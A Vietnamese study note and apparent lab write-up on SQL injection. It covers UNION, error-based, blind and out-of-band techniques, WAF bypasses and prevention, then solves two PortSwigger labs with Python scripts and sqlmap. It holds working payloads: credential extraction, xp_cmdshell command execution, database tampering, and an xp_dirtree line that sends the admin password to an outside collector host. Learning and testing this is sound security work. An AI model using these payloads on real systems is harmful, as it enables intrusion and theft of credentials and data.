# SQL injection (SQLi)

## SQL

- Chúng ta cần tìm hiểu thêm một chút về SQL. Những động từ sau đây là những động từ SQL phổ biến nhất và được hỗ trợ rộng rãi bởi các RDBMS:
  - **SELECT** - truy vấn dữ liệu từ một bảng
  - **INSERT** - thêm dữ liệu vào bảng
  - **UPDATE** - chỉnh sửa dữ liệu đã có
  - **DELETE** - xóa dữ liệu trong một bảng
  - **DROP** - xóa một bảng
  - **UNION** - ghép dữ liệu từ nhiều truy vấn với nhau
    - Các câu lệnh SELECT cần trả về số cột dữ liệu bằng nhau.
    - Các cột tương ứng cần có cùng kiểu dữ liệu.
- Tiếp theo chúng ta sẽ xét tới những từ khóa dùng để tùy chỉnh truy vấn hay gặp nhất trong SQL:
  - **WHERE** - bộ lọc SQL được sử dụng khi có điều kiện đi kèm
  - **AND/OR** - kết hợp với từ khóa WHERE để làm truy vấn cụ thể hơn
  - **LIMIT #1, #2** - Giới hạn lượng dữ liệu trả về #2 bắt đầu từ vị trí #1 (Ví dụ LIMIT 3,2; sẽ trả về 2 dòng dữ liệu thứ 4 và 5.)
  - **ORDER BY** - sắp xếp dữ liệu theo cột
- Các ký tự đặc biệt trong SQL
  - ![image](https://hackmd.io/_uploads/S1HVoYjcT.png)

## Khái niệm & Khai thác & Tác hại & Phòng tránh SQLi

- **Khái niệm**
  - SQL injection là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp. SQL injection có thể cho phép những kẻ tấn công thực hiện các thao tác, delete, insert, update,… trên cơ sở dữ liệu của ứng dụng, thậm chí là server mà ứng dụng đó đang chạy, lỗi này thường xảy ra trên các ứng dụng web có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase..
  - Cụ thể, dạng lỗ hổng này xuất phát từ việc các dữ liệu input của người dùng chưa được sát khuẩn (unsanitized) mà đã được đút thẳng vô query rồi đẩy vô cơ sở dữ liệu để thực thi.
  - Tác động có thể bao gồm việc cho phép đối tượng tấn công đọc được dữ liệu vượt thẩm quyền (ví dụ password, thông tin thẻ tín dụng, thông tin của các người dùng khác) hay thậm chí chỉnh sửa hoặc xóa luôn mịa dữ liệu làm ảnh hưởng đến hoạt động của ứng dụng. Đôi khi, đối tượng tấn công còn có thể triển khai các dạng tấn công leo thang để xâm phạm vô cả hạ tầng của ứng dụng, tạo backdoor, làm tổ, đẻ trứng các kiểu.

![image](https://hackmd.io/_uploads/S1vXERtq6.png)

- Lưu ý: Structured Query Language – SQL (Ngôn ngữ truy vấn có cấu trúc) là ngôn ngữ chính dùng để tương tác với Relational Databases (cơ sở dữ liệu quan hệ). Relational Databases bao gồm 1 hoặc nhiều tables (bảng) và mỗi bảng sẽ có 1 hoặc nhiều cột. Ví dụ so sánh đơn giản của Relational Database MySQL với một đối thủ NoSQL là mongDB như sau.

![image](https://hackmd.io/_uploads/BJZsNCt5p.png)

- Trong Oracle, tồn tại một bảng mặc định **dual**
  - **DUAL**: là bảng một hàng đặc biệt được hiển thị theo mặc định trong tất cả các cài đặt cơ sở dữ liệu của Oracle
  - **ALL_TABLES**: trả về thông tin các bảng người dùng hiện tại có thể truy cập
  - **ALL_TAB_COLUMNS**: trả về thông tin các cột của bảng
  - Trong ALL_TABLES có chứa các cột như TABLE_NAME, OWNER, ... Xét câu truy vấn sau:`SELECT TABLE_NAME, OWNER, TABLESPACE_NAME FROM all_tables`
  - ![image](https://hackmd.io/_uploads/rJJ9Eph56.png)
- Từ đây có payload kết hợp phép UNION trả về danh sách tên các bảng: `' UNION SELECT NULL, table_name FROM all_tables--`
  - Tương tự, chúng ta có payload kết hợp phép UNION trả về danh sách tên các cột: `' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'Users'--`
- Đối với hầu hết các hệ cơ sở dữ liệu (trừ Oracle) thì đều chứa một cơ sở dữ liệu thông tin là **INFORMATION_SCHEMA**
  - Trước hết, chúng ta cần biết tới **INFORMATION_SCHEMA** trong MySQL - là một cơ sở dữ liệu thông tin, tại đây lưu trữ thông tin các cơ sở dữ liệu khác của MySQL. Trong cơ sở dữ liệu thông tin này có nhiều bảng và view, tuy nhiên có lẽ hay sử dụng nhiều nhất là các bảng TABLES - chứa tất cả thông tin về các bảng, COLUMNS - chứa tất cả các thông tin về các cột của các bảng, USER_PRIVILEGES - chứa tất cả các thông tin về quyền truy cập của các người dùng đối với mỗi cơ sở dữ liệu.
  - `SELECT * FROM information_schema.tables`

![image](https://hackmd.io/_uploads/r1x3-Fn56.png)

- Như chúng ta thấy, thông tin tên các bảng được liệt kê trong cột TABLE_NAME. Như vậy, để có thể kết hợp phép UNION nhằm hiển thị danh sách tên các bảng trong cơ sở dữ liệu, chúng ta có thể "hợp" dữ liệu trong cột TABLE_NAME này vào câu truy vấn chứa lỗ hổng SQL injection. Payload có dạng như sau: `' UNION SELECT NULL, table_name FROM information_schema.tables--`
- Sau khi có được danh sách tên bảng, chúng ta có thể truy xuất thông tin tất cả các cột từ một bảng cụ thể, chẳng hạn bảng Users với cú pháp như sau: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

![image](https://hackmd.io/_uploads/By1n8t2qp.png)

- Thông tin các cột được hiển thị trong cột COLUMN_NAME. Do đó có thể kết hợp phép UNION nhằm hiển thị danh sách tên các cột trong bảng Users với payload như sau: `' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'Users'--`
- **Khai thác**
  **1. THI HÀNH LỆNH TỪ XA BẰNG SQL INJECTION** - Nếu cài đặt với chế độ mặc định mà không có điều chỉnh gì, MS SQL Server sẽ chạy ở mức SYSTEM, tương đương với mức truy cập Administrator trên Windows. Có thể dùng store procedure xp_cmdshell trong CSDL master để thi hành lệnh từ xa: - mã `'; exec master..xp_cmdshell 'ping 10.10.1.2'--` - có thể listen các ICMP packet từ 10.10.1.2 bằng tcpdump như sau: `tcpdump icmp` . Nếu nhận được ping request từ 10.10.1.2 nghĩa là lệnh đã được thi hành.
  **2. NHẬN OUTPUT CỦA SQL QUERY** - Có thể dùng sp_makewebtask để ghi các output của SQL query ra một file HTML - mã `'; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"` - và folder “share” phải được share cho Everyone trước để chúng ta có thể đọ. Ví dụ như chúng ta tạo 1 file html mới và ghi nội dung của database vào đó và chúng ta có thể đọc nó như 1 trang web từ web server
  **3. NHẬN DỮ LIỆU QUA ‘DATABASE USING ODBC ERROR MESSAGE’** - Lấy ví dụ ở trên http://yoursite.com/index.asp?id=10, bây giờ chúng ta thử hợp nhất integer ’10’ với một string khác lấy từ CSDL: - mã `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--`. - Bảng INFORMATION_SCHEMA.TABLES của hệ thống SQL Server chứa thông tin về tất cả các bảng (table) có trên server. Trường TABLE_NAME chứa tên của mỗi bảng trong CSDL. Chúng ta chọn nó bởi vì chúng ta biết rằng nó luôn tồn tại. - Dòng query này sẽ trả về tên của bảng đầu tiên trong CSDL. Khi chúng ta kết hợp chuỗi này với số integer 10 qua statement UNION, MS SQL Server sẽ cố thử chuyển một string (nvarchar) thành một số integer. Điều này sẽ gặp lỗi nếu như không chuyển được nvarchar sang int, server sẽ hiện thông báo lỗi sau: - Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value **'table1'** to a column of data type int. /index.asp, line 5. - Thông báo lỗi trên cho biết giá trị muốn chuyển sang integer nhưng không được, **“table1“**. Đây cũng chính là tên của bảng đầu tiên trong CSDL mà chúng ta đang muốn có. - Để lấy tên của tên của bảng tiếp theo, có thể dùng query sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--` - Cũng có thể thử tìm dữ liệu bằng cách khác thông qua statement LIKE của câu lệnh SQL: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--` - Khi đó thông báo lỗi của SQL Server có thể là: Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'admin_login' to a column of data type int. /index.asp, line 5. - Mẫu so sánh ‘%25login%25’ sẽ tương đương với %login% trong SQL Server. Như thấy trong thông báo lỗi trên, chúng ta có thể xác định được tên của một table quan trọng là “admin_login“.
  **4. XÁC ĐỊNH TÊN CỦA CÁC COLUMN TRONG TABLE** - Table INFORMATION_SCHEMA.COLUMNS chứa tên của tất cả các column trong table. Có thể khai thác như sau: - mã: ` http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--` - Khi đó thông báo lỗi của SQL Server có thể như sau: Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value **'login_id'** to a column of data type int. /index.asp, line 5 - Như vậy tên của column đầu tiên là “login_id“. Để lấy tên của các column tiếp theo, có thể dùng mệnh đề logic `NOT IN ()` như sau:

  - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--` - Khi đó thông báo lỗi của SQL Server có thể như sau: Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_name' to a column of data type int. /index.asp, line 5 - Làm tương tự như trên, có thể lấy được tên của các column còn lại như “password“, “details“. Khi đó ta lấy tên của các column này qua các thông báo lỗi của SQL Server, như ví dụ sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--`
    **5. THU THẬP CÁC DỮ LIỆU QUAN TRỌNG** - Có thể lấy login_name đầu tiên trong table “admin_login” như sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 login_name FROM admin_login--` - Khi đó thông báo lỗi của SQL Server có thể như sau: Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'neo' to a column of data type int. /index.asp, line 5 - Dễ dàng nhận ra được admin user đầu tiên có login_name là “neo”. Hãy thử lấy password của “neo” như sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--` - Khi đó thông báo lỗi của SQL Server có thể như sau: Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'm4trix' to a column of data type int. /index.asp, line 5 - Và bây giờ là đã có thể login vào với username là “neo” và password là “m4trix“.
    **6. NHẬN CÁC NUMERIC STRING** - Có một hạn chế nhỏ đối với phương pháp trên. Chúng ta không thể nhận được các error message nếu server có thể chuyển text đúng ở dạng số (text chỉ chứa các kí tự số từ 0 đến 9). Giả sử như password của “trinity” là “31173“. Vậy nếu ta thi hành lệnh sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--` - Thì khi đó chỉ nhận được thông báo lỗi “Page Not Found“. Lý do bởi vì server có thể chuyển passoword “31173” sang dạng số trước khi UNION với integer 10. Để giải quyết vấn đề này, chúng ta có thể thêm một vài kí tự alphabet vào numeric string này để làm thất bại sự chuyển đổi từ text sang số của server. Dòng query mới như sau: - mã: `http://yoursite.com/index.asp?id=10 UNION SELECT TOP 1 convert(int, password%2b'%20morpheus') FROM admin_login where login_name='trinity'--` - Chúng ta dùng dấu cộng (+) để nối thêm text vào password (ASCII code của ‘+’ là 0x2b). Chúng ta thêm chuỗi ‘(space)morpheus’ vào cuối password để tạo ra một string mới không phải numeric string là ‘31173 morpheus’. Khi hàm convert() được gọi để chuyển ‘31173 morpheus’ sang integer, SQL server sẽ phát lỗi ODBC error message sau - Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value '31173 morpheus' to a column of data type int. /index.asp, line 5 - Và nghĩa là bây giờ ta cũng có thể login vào với username ‘trinity‘ và password là ‘31173‘
    **7. THAY ĐỔI DỮ LIỆU (UPDATE/INSERT) CỦA CSDL** - Khi đã có tên của tất cả các column trong table, có thể sử dụng lệnh UPDATE hoặc INSERT để sửa đổi/tạo mới một record vào table này. Để thay đổi password của “neo“, có thể làm như sau: - mã: ` http://yoursite.com/index.asp?id=10; UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--` - Hoặc nếu bạn muốn một record mới vào table: - mã: `http://yoursite.com/index.asp?id=10; INSERT INTO 'admin_login' ('login_id', 'login_name', 'password', 'details') VALUES (666,'neo2','newpas5','NA')--`

- **một số trường hợp SQL injection phổ biến như sau:**

  - **Retrieving hidden data**: Với loại này, bạn sẽ có thể thao túng SQL query để database trả về các kết quả mà đáng lý bạn không được phép truy cập;
  - **Subverting application logic**: Trường hợp này, bạn sẽ thao túng query để đâm thọc vô quá trình xử lý logic của ứng dụng. Đây là kiểu hay gặp trong tình huống xử lý đăng nhập của user. Đối tượng tấn công có thể dùng thủ thuật để cắn xén query nhằm thoát khỏi yêu cầu cung cấp password;
  - **UNION attack**: Với dạng này, bạn sẽ có thể truy cập dữ liệu từ nhiều bảng khác nhau của database với từ khóa UNION;
  - **Examining the database**: Kiểu này bạn sẽ có thể truy cập thông tin về phiên bản và cấu trúc của database. Các thông tin sẽ là bàn đạp để bạn tinh chỉnh các phương án tấn công để tăng tính hiệu quả;

    - ![image](https://hackmd.io/_uploads/BJQAgzjq6.png)

  - **Blind SQL injection**: Đây là kiểu tấn công mà kết quả của query bạn thao túng không gửi trả về trong response. Khoan! Không gửi kết quả gì về thì biết mịa gì mà tấn với chả công? Vâng, bởi vậy nó mới có tên gọi là “Blind” – tấn công kiểu mù quáng. Điểm nhấn quan trọng đối với kỹ thuật tấn công này là thử nghiệm các thay đổi trên query và ghi nhận sự khác biệt (nếu có) trong các response nhận về. Loại này hiển nhiên đòi hỏi kỹ thuật phức tạp và nhiều thời gian hơn để thử nghiệm và phân tích dữ liệu từ các response.

- **Phân loại**
- ![image](https://hackmd.io/_uploads/BJP_nr9qp.png)
  - **In-Band SQLi**: Các phản hồi nhận được kết quả truy vấn SQL. Được chia thành 2 loại:
    - **Union-based SQLi**: Sử dụng câu lệnh UNION trong các truy vấn SQL để truy cập vào db.
    - **Error-based SQLi**: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc db từ đó tìm cách truy cập vào db.
  - **Blind SQLi**:
  - một số câu lệnh thường sử dụng trong tấn công Blind SQL injection:
- Length: độ dài:

| database management system | Length syntax             |
| -------------------------- | ------------------------- |
| Oracle                     | LENGTH(string_expression) |
| Microsoft                  | LEN(string_expression)    |
| PostgreSQL                 | LENGTH(string_expression) |
| MySQL                      | MySQL                     |

- Substring: lấy chuỗi con

| database management system | Substring syntax         |
| -------------------------- | ------------------------ |
| Oracle                     | SUBSTR('cuong', 4, 2)    |
| Microsoft                  | SUBSTRING('cuong', 4, 2) |
| PostgreSQL                 | SUBSTRING('cuong', 4, 2) |
| MySQL                      | SUBSTR('cuong', 4, 2)    |

Kết quả các câu lệnh trên đều trả về chuỗi lo nghĩa là lấy hai ký tự bắt đầu từ vị trí số 4 (tính từ 1)

- Các phản hồi không chứa kết quả truy vấn SQL. Được chia thành 2 loại:

  - **Boolean**: Câu truy vấn trả về chỉ cho biết đúng hoặc sai từ đó attacker điều chỉnh câu truy vấn để khai thác. - Tiến hành khai thác và tên database hiện tại sẽ được lấy ra đầu tiên để biết ta đang có quyền làm việc trên database nào. Muốn xác định tên database đầu tiên ta cần xác định độ dài tên database sau đó mới tìm tên database.
  - VD: `boolean' or length((select database()))=1#` Sau khi đã có được độ dài tên database tiếp đến ta sẽ tìm tên database: `boolean' or substring((select database()),1,1)='a'#`

    - ![image](https://hackmd.io/_uploads/r1WV-Msca.png)

  - **Time-based**: Attacker sẽ sử dụng câu truy vấn làm db trả về kết trong 1 thời gian xác định tùy thuộc tính đúng sai từ đó điều chỉnh câu truy vấn để khai thác. Dùng một câu lệnh SQL chứa lệnh Sleep(), hoặc một hàm nào đó để nghỉ khi gặp điều kiện đúng. Ví dụ IF(điều kiện, điều kiện nếu đúng-> Sleep(10), đk nếu sai -> null)
    - vd: Attacker thực hiện việc so sánh `IF(23=23,0,5)` câu lệnh này thực hiện nếu như 23=23 đúng trả về 0 ngược lại trả về 5. Tiếp đến là `SLEEP(5-(IF(23=23,0,5)` nếu như biểu thức trước đó trả về 0 thì sẽ slee(5-0) và ngược lại sleep(5-5), tức là nếu như 23=23 thì sẽ sleep(5) và ngược lại thì sleep(0).
    - ![image](https://hackmd.io/_uploads/Syu1iapqp.png)

- **Out-of-Band SQLi**: Tấn công sử dụng một cấu trúc truy vấn SQL để yêu cầu sever trả về kết quả thông qua các kênh liên quan đến mạng. Kiểu tấn công này xảy ra khi hacker không thể trực tiếp tấn công và thu thập kết quả trực tiếp trên cùng một kênh (In-band SQLi), và đặc biệt là việc phản hồi từ server là không ổn định, Kiểu tấn công này phụ thuộc vào khả năng server thực hiện các request DNS hoặc HTTP để chuyển dữ liệu cho kẻ tấn công. Ví dụ như câu lệnh xp_dirtree trên Microsoft SQL Server có thể sử dụng để thực hiện DNS request tới một server khác do kẻ tấn công kiểm soát
  - Sau khi xác định vị trí xảy ra lỗ hổng Blind SQL injection và có thể khai thác bằng kỹ thuật Out-of-band, tiếp theo có thể thực hiện truy xuất dữ liệu. Chẳng hạn chúng ta cần khai thác mật khẩu của người dùng administrator trong cột password, bảng users, xây dựng payload như sau:

```sql!
'; declare @t varchar(1024);set @t=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@t+'.b8k3x9r3ws891m1ceppwxj0ksby2mr.oastify.com/a"')--
```

- chúng ta sẽ nhận được một request gửi từ database trang web.
- Khi thực thi câu truy vấn, trong cơ sở dữ liệu sẽ khai báo một biến @t có kiểu varchar, kích thước 1024, gán giá trị cho nó bằng kết quả câu truy vấn SELECT password FROM users WHERE username='administrator', và "đính kèm" biến này vào tên miền được phân giải trong dịch vụ phân giải DNS. Về phía nhận sẽ thu được request cùng với biến @t - chính là mật khẩu người dùng administrator chúng ta cần tìm kiếm

cú pháp thực hiện quá trình DNS lookup

![image](https://hackmd.io/_uploads/H19vTRp5p.png)

cú pháp truy xuất dữ liệu trong kỹ thuật Out-of-band với từng loại cơ sở dữ liệu:

![image](https://hackmd.io/_uploads/r1R-RC6c6.png)

Lưu ý trong MySQL, các cú pháp dùng cho hệ điều hành Window.

![image](https://hackmd.io/_uploads/HyEuR0a56.png)

- **Phát hiện**

  - Gửi dấu nháy đơn `'` , nháy kép `"`, chấm phẩy `;`, ký tự comment như `--`, `#`,... và chờ kết quả phản hồi của web
  - ![image](https://hackmd.io/_uploads/HkAYlzj96.png)

  - Gửi các điều kiện boolean như `OR 1=1`, `OR 1=2` ... và xem phản hồi.
  - `' or 1=1--   " or 1=1--   or 1=1--   ' or 'a'='a   " or "a"="a   ') or ('a'='a`
  - Thỉnh thoảng chỉ cần gõ [‘ or “] vào trường kiểm tra. Nếu nó trả ra bất kỳ thông báo không mong muốn hoặc bất thường nào, chúng ta có thể chắc chắn rằng SQL Injection có thể thực hiện với trường đó.
  - Gửi payload thử thời gian trả về như `SLEEP(5)`, `pg_sleep(10)`, `DELAY '0:0:10'` ...
  - ![image](https://hackmd.io/_uploads/BkrMezi5p.png)

- Khai thác tự động
  - Sử dụng sqlmap, sử dụng các wordlists về payload để brute-force...
- chúng ta có thể dùng cheatsheet của portswigger để phục vụ cho việc khia thác: https://portswigger.net/web-security/sql-injection/cheat-sheet
- Bypass WAF

  - Thay đổi ký tự tấn công hỗn hợp (Mixed Case Change)
    - Thông thường, với một firewall áp dụng cơ chế blacklist, nó sẽ lọc theo các từ khóa tấn công như union, select... Với một bộ lọc yếu, bạn có thể thay đổi union thành Union hoặc UniOn... Ví dụ: http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4
  - Thay thế từ khóa (Chèn các ký tự đặc biệt sẽ bị xóa bởi WAF) - SELECT có thể trở thành SEL<ECT sẽ được chuyển thành SELECT khi ký tự vi phạm bị xóa. Ví dụ: http://target.com/index.php?page_id=-15&nbsp;UNIunionON SELselectECT 1,2,3,4
  - Sử dụng mã hóa:
    - URL encode: `page.php?id=1%252f%252a*/UNION%252f%252a /SELECT`
    - Hex encode: `target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4`
    - `SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))`
    - Unicode encode: `?id=10%D6‘%20AND%201=2%23`
  - Sử dụng comment: Chèn cú pháp comment vào giữa các chuỗi tấn công. Chẳng hạn, `/ *! SELECT * /` có thể bị WAF bỏ qua nhưng được chuyển đến ứng dụng đích và được xử lý bởi cơ sở dữ liệu mysql. Ví dụ: `index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 'union%a0select pass from users#`
  - Sử dụng các ký tự đặc biệt: `、~、!、@、%、()、[]、.、-、+ 、|、%00`
  - Kiểm soát tham số HTTP (HTTP_Parameter_Pollution): Cung cấp nhiều bộ tham số = giá trị cùng tên để gây nhầm lẫn cho WAF. Lấy ví dụ `http://example.com?id=1&?id=’ or ‘1’=’1′ -‘` trong một số trường hợp như với Apache/PHP, ứng dụng sẽ chỉ phân tích "id =" trong khi WAF chỉ phân tích cú pháp đầu tiên. Nó dường như là một yêu cầu hợp pháp nhưng ứng dụng vẫn nhận và xử lý đầu vào độc hại. Hầu hết WAF ngày nay không dễ bị vượt qua bởi HTTP_Parameter_Pollution nhưng vẫn đáng để thử khi tìm cách vượt qua tường lửa.```
  - Tràn bộ nhớ (Buffer overflow) Các ứng dụng, kể cả firewall dễ bị lỗi phần mềm giống như bất kỳ ứng dụng nào khác. Nếu một điều kiện tràn bộ đệm có thể tạo ra sự cố, ngay cả khi nó không dẫn đến thực thi mã, điều này có thể dẫn đến WAF không mở được. Lúc này chúng ta có thể vượt qua tường lửa.

- **Tác hại** - Một cuộc tấn công SQL injection thành công có thể dẫn đến truy cập trái phép vào dữ liệu nhạy cảm, chẳng hạn như mật khẩu, chi tiết thẻ tín dụng hoặc thông tin người dùng cá nhân. Nhiều vụ vi phạm dữ liệu nghiêm trọng trong những năm gần đây là kết quả của các cuộc tấn công SQL injection, dẫn đến thiệt hại về uy tín và tiền phạt theo quy định. Trong một số trường hợp, kẻ tấn công có thể chiếm được một backdoor vào hệ thống của tổ chức, dẫn đến một sự xâm phạm lâu dài có thể không được chú ý trong một thời gian dài.
- **Phòng tránh** - Lọc dữ liệu từ người dùng: Cách phòng chống này tương tự như XSS. Ta sử dụng filter để lọc các kí tự đặc biệt `(; ” ‘)` hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. Nên sử dụng thư viện/function được cung cấp bởi framework. Viết lại từ đầu vừa tốn thời gian vừa dễ sơ sót. - Không cộng chuỗi để tạo SQL: Sử dụng parameter thay vì cộng chuỗi. Nếu dữ liệu truyền vào không hợp pháp, SQL Engine sẽ tự động báo lỗi, ta không cần dùng code để check - Không hiển thị exception, message lỗi: Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng. - trong PHP sử dụng hàm mysql_real_escape_string có nhiệm vụ loại bỏ ký tự đặc biệt, chuyển một chuỗi thành chuỗi query an toàn. Ví dụ: `mysql_real_escape_string("username"), ` `mysql_real_escape_string("password"));` - Gần đây, hầu như chúng ta ít viết SQL thuần mà toàn sử dụng ORM (Object-Relational Mapping) framework. Các framework web này sẽ tự tạo câu lệnh SQL nên hacker cũng khó tấn công hơn.

## 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

link: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

### Đề bài

![image](https://hackmd.io/_uploads/SkgSx4s5a.png)

### Phân tích

- Lab này yêu cầu mình thực hiện tấn công kiểu SQL Injection vào trang web khiến trang web hiện tất cả những mặt hàng có trong danh sách, cả những mặt hàng đã được ra mắt và chưa ra mắt
- Lab đã cho mình biết được nơi mà mình có thể khai thác SQL Injection, là chỗ phân loại sản phẩm, nên em đã vào BurpSuite để bắt lấy request chọn category:

![image](https://hackmd.io/_uploads/rJu0W4j56.png)

![image](https://hackmd.io/_uploads/BkSWzEo56.png)

Thử lọc sản phẩm theo Accessories, có thể thấy đó là GET request đến /filter?category=Accessories.

- Dựa vào mô tả, bài lab sử dụng câu query sau để thực hiện lọc các sản phẩm:

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

### Khai thác

- Như vậy để solve bài lab với mục tiêu liệt kê tất cả sản phẩm có trong database, ta chỉ cần truyền giá trị cho category là `Accessories' or '1'='1' --` . Lúc này câu query trở thành:

```sql
SELECT * FROM products WHERE category = 'Accessories' or '1'='1' --' AND released = 1
```

- câu lệnh kia sẽ phân loại theo tên category và yếu tố released = 1, nên công việc của mình là: chèn vào 1 phần tử luôn đúng, khi đó sẽ không còn có chuyện phân loại theo tên category, và làm cho yếu tố released = 1 vô dụng.
- vì 1 luôn bằng 1 nên nó sẽ hiện hết các sản
- phẩm do câu lệnh SQL là SELECT \* (chọn hết), sau đó tiếp tục thêm phần `--` là ký hiệu của chú thích, nghĩa là sau dấu `--` tất cả sẽ vô nghĩa, nên phần lệnh `AND released = 1` đã trở nên vô nghĩa. - `category = 'Accessories' or '1'='1'` là điều kiện luôn đúng
  `--' AND released = 1`: phần sau đã bị comment

![image](https://hackmd.io/_uploads/Bk9mrVj9p.png)

gửi request và mình solve được lab

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ab500c00442e54b808d26b000d30022.web-security-academy.net'

payload = "Accessories' or '1'='1' --"
params = {
    'category' : payload,
}
response = requests.get(
    url + "/filter",
    params=params,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được lab này

![image](https://hackmd.io/_uploads/HyCDHEs5p.png)

### SQLMAP

- mình đã làm lại bài này và dùng sqlmap với payload

```!
sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch
```

![ảnh](https://hackmd.io/_uploads/SJUfCb73T.png)

![ảnh](https://hackmd.io/_uploads/H19XCWX3p.png)

mình biết được database ở đây dùng là PostgreSQL

mình sẽ tìm database được dùng trong web này

![ảnh](https://hackmd.io/_uploads/HJ3PkMXnT.png)

và mình tìm được database là **public**

![ảnh](https://hackmd.io/_uploads/Bk6TkfQ36.png)

tìm trong database public mình được table products với

```sql!
 sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public --tables
        ___
```

tiếp tục tìm thông tin về tên các cột với lệnh

```!
sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public -T  products --columns
```

mình được

![ảnh](https://hackmd.io/_uploads/ryt7Zzm26.png)

và mình tìm được 8 cột trong đó có cột released

mình lấy thông tin sản phẩm của bảng products này ra với lệnh

```!
sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public -T  products --dump
```

và được

![ảnh](https://hackmd.io/_uploads/r1dkmz7n6.png)

và xem được 17 sản phẩm trong table trong khi trang web chỉ hiển thị ra giao diện web 12 sản phẩm

![ảnh](https://hackmd.io/_uploads/SJ3rQMXhp.png)

## 2. Lab: SQL injection vulnerability allowing login bypass

link: https://portswigger.net/web-security/sql-injection/lab-login-bypass

### Đề bài

![image](https://hackmd.io/_uploads/SkI3UVic6.png)

### Phân tích

- Lab này chứa một lỗ hổng SQL Injection ở phần đăng nhập, để giải quyết lab này, mình cần phải thực hiện SQL injection để đăng nhập vào ứng dụng với tài khoản admin

mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/Hkz3uNscT.png)

- bài lab này có thể sử dụng câu query sau để xác thực xem tài khoản có tồn tại không. Ví dụ với account `wiener:peter`

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'
```

### Khai thác

Lúc này dễ dàng thấy, nếu chèn username là một điều kiện luôn đúng và comment phần sau lại thì sẽ bypass thành công. Cụ thể, để đăng nhập được với administrator, ta chỉ cần gửi username=`administrator' or '1'='1' --` . Lúc này câu query trở thành:

```sql
SELECT * FROM users WHERE username = 'administrator' or '1'='1' -- AND password = 'peter'
```

![image](https://hackmd.io/_uploads/BybujVj9a.png)

và mình đã được chuyển hướng đến trang tài khoản admin

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
